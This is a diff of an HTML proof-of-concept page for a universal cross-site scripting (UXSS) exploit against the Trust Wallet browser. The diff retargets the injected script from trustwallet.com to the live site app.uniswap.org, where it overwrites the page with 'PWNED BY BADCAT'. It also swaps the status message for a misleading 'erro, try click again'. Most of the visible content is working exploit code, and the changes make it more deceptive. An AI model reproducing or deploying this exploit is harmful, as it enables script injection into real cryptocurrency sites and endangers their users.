@@ -3,10 +3,9 @@
 <meta charset="utf-8">
 <title>Trust Wallet UXSS</title>
 </head><body>
-<a id="run" href="https://trustwallet.com/">Trigger UXSS on example.com</a>
+<a id="run" href="https://app.uniswap.org/">Trigger UXSS on example.com</a>
 <pre id="status"></pre>
 <script>
-  location="http://google.com:83"
 const status = document.querySelector('#status');
 const runLink = document.querySelector('#run');
 const dummyMessage = 'Trust Wallet UXSS lab test only. No authorization or asset transfer.';
@@ -14,7 +13,7 @@ const dummyMessageHex = '0x' + Array.from(new TextEncoder().encode(dummyMessage)
   byte => byte.toString(16).padStart(2, '0')).join('');
 
 const injectedId = `(
-  location.hostname === "trustwallet.com" && !window.__uxssChainTriggered
+  location.hostname === "app.uniswap.org" && !window.__uxssChainTriggered
     ? (
       window.__uxssChainTriggered = true,
       document.write('<h1>UXSS</ha1><br><h1>PWNED BY BADCAT</h1>'),
@@ -62,7 +61,7 @@ runLink.addEventListener('click', (event) => {
   }
   if (!armed) {
     armed = true;
-    status.textContent = 'Navigating to example.com…';
+    status.textContent = 'erro, try click again';
     window.addEventListener('pagehide', () => {
     
       for (let i = 0; i < 12; i++) {
